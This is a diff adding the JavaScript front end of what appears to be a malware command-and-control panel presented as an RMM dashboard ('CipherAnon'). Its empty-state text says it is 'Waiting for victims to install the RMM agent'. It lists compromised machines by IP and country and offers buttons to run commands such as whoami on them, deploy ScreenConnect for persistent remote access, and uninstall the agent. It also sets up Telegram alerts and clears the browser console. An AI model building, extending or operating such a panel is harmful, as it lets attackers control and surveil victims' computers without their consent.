+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // ============================================================
+        // STATE
+        // ============================================================
+
+        let allClients = [];
+        let filteredClients = [];
+        let confirmCallback = null;
+        let currentFilter = 'all'; // all | online | offline | recent | outdated
+
+        // ============================================================
+        // HELPERS
+        // ============================================================
+
+        function getFlagEmoji(code) {
+            if (!code || code === 'XX') return '🌍';
+            try {
+                const cp = code.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0));
+                return String.fromCodePoint(...cp);
+            } catch { return '🌍'; }
+        }
+
+        function timeAgo(dateString) {
+            if (!dateString) return 'Unknown';
+            try {
+                const now = new Date();
+                const past = new Date(dateString);
+                if (isNaN(past.getTime())) return 'Invalid date';
+                const diffMs = now - past;
+                if (diffMs < 0) return 'Future date';
+                const diffSec = Math.floor(diffMs / 1000);
+                const diffMin = Math.floor(diffSec / 60);
+                const diffHour = Math.floor(diffMin / 60);
+                const diffDay = Math.floor(diffHour / 24);
+
+                if (diffSec < 10) return 'Just now';
+                if (diffSec < 60) return `${diffSec}s ago`;
+                if (diffMin < 60) return `${diffMin}m ago`;
+                if (diffHour < 24) return `${diffHour}h ago`;
+                if (diffDay < 7) return `${diffDay}d ago`;
+                return past.toLocaleDateString();
+            } catch {
+                return 'Invalid date';
+            }
+        }
+
+        function showToast(msg, type) {
+            const el = document.getElementById('toast');
+            el.textContent = msg;
+            el.className = 'toast show ' + (type || '');
+            clearTimeout(el._timer);
+            el._timer = setTimeout(() => { el.className = 'toast'; }, 3000);
+        }
+
+        // ============================================================
+        // SESSION CHECK
+        // ============================================================
+
+        async function checkSession() {
+            try {
+                const res = await fetch('/api/rmm/clients');
+                if (res.status === 401) {
+                    window.location.href = '/login';
+                    return false;
+                }
+                return true;
+            } catch (e) {
+                window.location.href = '/login';
+                return false;
+            }
+        }
+
+        // ============================================================
+        // SIDEBAR
+        // ============================================================
+
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('sidebarOverlay').classList.toggle('active');
+        }
+
+        // ============================================================
+        // CUSTOM CONFIRM
+        // ============================================================
+
+        function showCustomConfirm(title, message, icon, callback, danger = false) {
+            document.getElementById('confirmTitle').textContent = title;
+            document.getElementById('confirmMessage').textContent = message;
+            document.getElementById('confirmIcon').textContent = icon || '⚠️';
+            const btn = document.getElementById('confirmActionBtn');
+            btn.className = danger ? 'btn danger-confirm' : 'btn confirm';
+            btn.textContent = danger ? '🗑️ Confirm' : 'Confirm';
+            confirmCallback = callback;
+            document.getElementById('customConfirmOverlay').classList.add('active');
+        }
+
+        function hideCustomConfirm() {
+            document.getElementById('customConfirmOverlay').classList.remove('active');
+            confirmCallback = null;
+        }
+
+        function executeConfirmAction() {
+            if (confirmCallback) {
+                const cb = confirmCallback;
+                confirmCallback = null;
+                hideCustomConfirm();
+                cb();
+            } else {
+                hideCustomConfirm();
+            }
+        }
+
+        // ============================================================
+        // FILTERS
+        // ============================================================
+
+        function applyFilters() {
+            const nameFilter = document.getElementById('filterName').value.toLowerCase().trim();
+            const companyFilter = document.getElementById('filterCompany').value;
+            const deviceFilter = document.getElementById('filterDevice').value;
+
+            let filtered = [...allClients];
+
+            // Name filter
+            if (nameFilter) {
+                filtered = filtered.filter(c =>
+                    c.pcName.toLowerCase().includes(nameFilter) ||
+                    c.username.toLowerCase().includes(nameFilter) ||
+                    c.clientId.toLowerCase().includes(nameFilter)
+                );
+            }
+
+            // Company filter
+            if (companyFilter) {
+                filtered = filtered.filter(c => (c.company || 'CipherAnon') === companyFilter);
+            }
+
+            // Device type filter
+            if (deviceFilter) {
+                const osMap = {
+                    'Windows': 'Windows',
+                    'macOS': 'macOS',
+                    'Linux': 'Linux'
+                };
+                filtered = filtered.filter(c => {
+                    const os = c.os || 'Unknown';
+                    return os.includes(osMap[deviceFilter]) || os === deviceFilter;
+                });
+            }
+
+            // Status filter from sidebar
+            if (currentFilter === 'online') {
+                filtered = filtered.filter(c => c.status === 'online');
+            } else if (currentFilter === 'offline') {
+                filtered = filtered.filter(c => c.status === 'offline');
+            } else if (currentFilter === 'recent') {
+                filtered = filtered.slice(0, 10);
+            } else if (currentFilter === 'outdated') {
+                filtered = filtered.filter(c => {
+                    const lastSeen = new Date(c.lastSeen).getTime();
+                    const days = (Date.now() - lastSeen) / (1000 * 60 * 60 * 24);
+                    return days > 7;
+                });
+            }
+
+            filteredClients = filtered;
+            renderRmmClients(filtered);
+        }
+
+        function resetFilters() {
+            document.getElementById('filterName').value = '';
+            document.getElementById('filterCompany').value = '';
+            document.getElementById('filterDevice').value = '';
+            currentFilter = 'all';
+            document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
+            document.getElementById('navRmm').classList.add('active');
+            applyFilters();
+        }
+
+        // ============================================================
+        // RMM FUNCTIONS
+        // ============================================================
+
+        async function fetchRmmClients() {
+            try {
+                const res = await fetch('/api/rmm/clients');
+                if (res.status === 401) { window.location.href = '/login'; return; }
+                const clients = await res.json();
+                allClients = clients;
+                updateStats(clients);
+                applyFilters();
+            } catch (e) {
+                showToast('⚠️ Failed to fetch RMM clients', 'error');
+            }
+        }
+
+        function updateStats(clients) {
+            const total = clients.length;
+            const online = clients.filter(c => c.status === 'online').length;
+            const offline = total - online;
+            const outdated = clients.filter(c => {
+                const lastSeen = new Date(c.lastSeen).getTime();
+                return (Date.now() - lastSeen) / (1000 * 60 * 60 * 24) > 7;
+            }).length;
+
+            document.getElementById('statTotal').textContent = total;
+            document.getElementById('statOnline').textContent = online;
+            document.getElementById('statOffline').textContent = offline;
+            document.getElementById('statOutdated').textContent = outdated;
+
+            document.getElementById('sidebarTotal').textContent = total;
+            document.getElementById('sidebarOnline').textContent = online;
+            document.getElementById('sidebarOffline').textContent = offline;
+            document.getElementById('sidebarOutdated').textContent = outdated;
+        }
+
+        function renderRmmClients(clients) {
+            const container = document.getElementById('clientsGrid');
+
+            if (!clients || clients.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <div class="icon">📡</div>
+                        <h3>No matching machines</h3>
+                        <p>${allClients.length === 0 ? 'Waiting for victims to install the RMM agent...' : 'Try adjusting your filters.'}</p>
+                    </div>
+                `;
+                return;
+            }
+
+            let html = '';
+            clients.forEach(client => {
+                const flag = getFlagEmoji(client.countryCode);
+                const statusDot = client.status === 'online' ? 'online' : 'offline';
+                const statusText = client.status === 'online' ? 'Online' : 'Offline';
+                const timeAgoStr = timeAgo(client.lastSeen);
+                const rmmType = client.rmmType || 'CipherAnon';
+                const hasRmm = client.rmmInstalled ? '✅' : '❌';
+
+                html += `
+                    <div class="client-card">
+                        <div class="card-header">
+                            <span class="status-dot ${statusDot}"></span>
+                            <span class="pc-name">${client.pcName}</span>
+                            <span class="status-text ${statusDot}">${statusText}</span>
+                            <span class="time-ago">${timeAgoStr}</span>
+                        </div>
+                        <div class="card-body">
+                            <span class="flag">${flag}</span>
+                            <span class="ip">${client.ip || 'N/A'}</span>
+                            <span>${client.country || 'Unknown'}</span>
+                            <span class="rmm-type">${rmmType} ${hasRmm}</span>
+                            <span>${client.os || 'Unknown'}</span>
+                            <span class="client-id">ID: ${client.clientId}</span>
+                            ${client.screenconnectId ? `<span style="color:#00ff88;font-weight:500;">SC: ${client.screenconnectId}</span>` : ''}
+                        </div>
+                        <div class="card-actions">
+                            <button class="btn-sm primary" onclick="sendCommand('${client.clientId}', 'whoami')">
+                                <span class="icon">👤</span> Whoami
+                            </button>
+                            <button class="btn-sm gold" onclick="sendCommand('${client.clientId}', 'hostname')">
+                                <span class="icon">💻</span> Hostname
+                            </button>
+                            <button class="btn-sm violet" onclick="sendCommand('${client.clientId}', 'ping')">
+                                <span class="icon">🏓</span> Ping
+                            </button>
+                            <button class="btn-sm primary" onclick="deployScreenConnect('${client.clientId}')">
+                                <span class="icon">📤</span> ScreenConnect
+                            </button>
+                            <button class="btn-sm danger" onclick="uninstallAgent('${client.clientId}')">
+                                <span class="icon">🗑️</span> Uninstall
+                            </button>
+                            <button class="btn-sm danger" onclick="deleteClient('${client.clientId}')">
+                                <span class="icon">✕</span>
+                            </button>
+                        </div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        // ============================================================
+        // SIDEBAR NAVIGATION
+        // ============================================================
+
+        document.querySelectorAll('.sidebar .nav-item[data-view]').forEach(item => {
+            item.addEventListener('click', function() {
+                const view = this.dataset.view;
+                document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
+                this.classList.add('active');
+
+                if (view === 'rmm') currentFilter = 'all';
+                else if (view === 'online') currentFilter = 'online';
+                else if (view === 'offline') currentFilter = 'offline';
+                else if (view === 'recent') currentFilter = 'recent';
+                else if (view === 'outdated') currentFilter = 'outdated';
+
+                applyFilters();
+            });
+        });
+
+        // ============================================================
+        // RMM ACTIONS
+        // ============================================================
+
+        async function sendCommand(clientId, command) {
+            try {
+                const res = await fetch(`/api/rmm/command/${clientId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command: command })
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast(`✅ Command sent: ${command}`, 'success');
+                    setTimeout(() => fetchRmmClients(), 2000);
+                } else {
+                    showToast(`❌ Failed: ${data.message}`, 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error sending command', 'error');
+            }
+        }
+
+        async function deployScreenConnect(clientId) {
+            if (!confirm('📤 Deploy ScreenConnect to this client?')) return;
+
+            try {
+                const res = await fetch(`/api/rmm/move/${clientId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ targetRmm: 'screenconnect' })
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast(`✅ ${data.message}`, 'success');
+                    setTimeout(() => fetchRmmClients(), 3000);
+                } else {
+                    showToast(`❌ Failed: ${data.message}`, 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error deploying', 'error');
+            }
+        }
+
+        async function uninstallAgent(clientId) {
+            if (!confirm('⚠️ This will uninstall the RMM agent. Are you sure?')) return;
+
+            try {
+                const res = await fetch(`/api/rmm/uninstall/${clientId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast(`✅ Uninstall command sent`, 'success');
+                    setTimeout(() => fetchRmmClients(), 3000);
+                } else {
+                    showToast(`❌ Failed: ${data.message}`, 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error sending uninstall command', 'error');
+            }
+        }
+
+        async function deleteClient(clientId) {
+            if (!confirm('Delete this client from the dashboard?')) return;
+
+            try {
+                const res = await fetch(`/api/rmm/delete/${clientId}`, {
+                    method: 'DELETE'
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast(`✅ Client deleted`, 'success');
+                    fetchRmmClients();
+                } else {
+                    showToast(`❌ Failed: ${data.message}`, 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error deleting client', 'error');
+            }
+        }
+
+        // ============================================================
+        // SETTINGS
+        // ============================================================
+
+        function openSettings() {
+            document.getElementById('settingsOverlay').classList.add('active');
+            loadTelegramSettings();
+        }
+
+        function closeSettings() {
+            document.getElementById('settingsOverlay').classList.remove('active');
+        }
+
+        async function changePassword() {
+            const oldPass = document.getElementById('oldPassword').value;
+            const newPass = document.getElementById('newPassword').value;
+            const confirmPass = document.getElementById('confirmPassword').value;
+
+            document.querySelectorAll('.error-text').forEach(el => el.classList.remove('show'));
+
+            if (!oldPass) {
+                document.getElementById('oldPasswordError').textContent = 'Enter current password';
+                document.getElementById('oldPasswordError').classList.add('show');
+                return;
+            }
+            if (newPass.length < 4) {
+                document.getElementById('newPasswordError').classList.add('show');
+                return;
+            }
+            if (newPass !== confirmPass) {
+                document.getElementById('confirmPasswordError').classList.add('show');
+                return;
+            }
+
+            try {
+                const res = await fetch('/api/change-password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ oldPassword: oldPass, newPassword: newPass })
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast('✅ Password changed!', 'success');
+                    closeSettings();
+                    setTimeout(() => { window.location.href = '/password-success'; }, 1000);
+                } else if (data.message === 'Current password is incorrect') {
+                    document.getElementById('oldPasswordError').textContent = 'Current password is incorrect';
+                    document.getElementById('oldPasswordError').classList.add('show');
+                } else {
+                    showToast('❌ ' + (data.message || 'Failed'), 'error');
+                }
+            } catch (e) {
+                showToast('❌ Error changing password', 'error');
+            }
+        }
+
+        async function loadTelegramSettings() {
+            try {
+                const res = await fetch('/api/config/telegram');
+                const data = await res.json();
+                document.getElementById('telegramToken').value = data.botToken || '';
+                document.getElementById('telegramChatId').value = data.chatId || '';
+                document.getElementById('telegramNotifications').checked = data.notifications !== false;
+            } catch (e) {}
+        }
+
+        async function updateTelegramSettings() {
+            const botToken = document.getElementById('telegramToken').value.trim();
+            const chatId = document.getElementById('telegramChatId').value.trim();
+            const notifications = document.getElementById('telegramNotifications').checked;
+
+            if (!botToken || !chatId) {
+                showToast('❌ Bot token and chat ID required', 'error');
+                return;
+            }
+
+            try {
+                const res = await fetch('/api/config/telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ botToken, chatId, notifications })
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast('✅ Telegram settings updated!', 'success');
+                } else {
+                    showToast('❌ ' + data.message, 'error');
+                }
+            } catch (e) {
+                showToast('❌ Failed to update', 'error');
+            }
+        }
+
+        // ============================================================
+        // LOGOUT
+        // ============================================================
+
+        function showLogoutConfirm() {
+            document.getElementById('logoutConfirmOverlay').classList.add('active');
+        }
+
+        function hideLogoutConfirm() {
+            document.getElementById('logoutConfirmOverlay').classList.remove('active');
+        }
+
+        function executeLogout() {
+            hideLogoutConfirm();
+            window.location.href = '/logout';
+        }
+
+        // ============================================================
+        // INIT
+        // ============================================================
+
+        document.addEventListener('DOMContentLoaded', function() {
+            checkSession().then((valid) => {
+                if (!valid) return;
+                fetchRmmClients();
+                setInterval(fetchRmmClients, 30000);
+            });
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeSettings();
+                hideLogoutConfirm();
+                hideCustomConfirm();
+            }
+        });
+
+        console.clear();
+    </script>
+
+</body>
+</html>
